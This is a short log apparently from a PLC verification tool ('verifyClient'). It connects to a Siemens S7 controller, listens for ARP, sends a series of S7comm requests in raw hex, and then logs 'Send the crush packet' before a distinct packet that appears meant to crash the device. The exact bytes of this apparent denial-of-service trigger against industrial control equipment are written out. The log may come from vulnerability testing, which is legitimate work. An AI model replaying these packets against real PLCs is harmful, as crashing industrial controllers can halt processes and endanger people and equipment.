[2021-12-19 20:06:16,919] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:06:17,046] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 20:06:17,046] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 20:06:17,047] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:06:17,047] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 7
[2021-12-19 20:06:17,050] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 20:06:17,264] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 20:06:17,467] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 20:06:17,672] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 20:06:17,876] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 20:06:18,093] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 20:06:18,309] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 20:06:18,900] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:06:18,903] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100000900000e00000401120a10010003000083000001
[2021-12-19 20:06:19,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:19,319] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
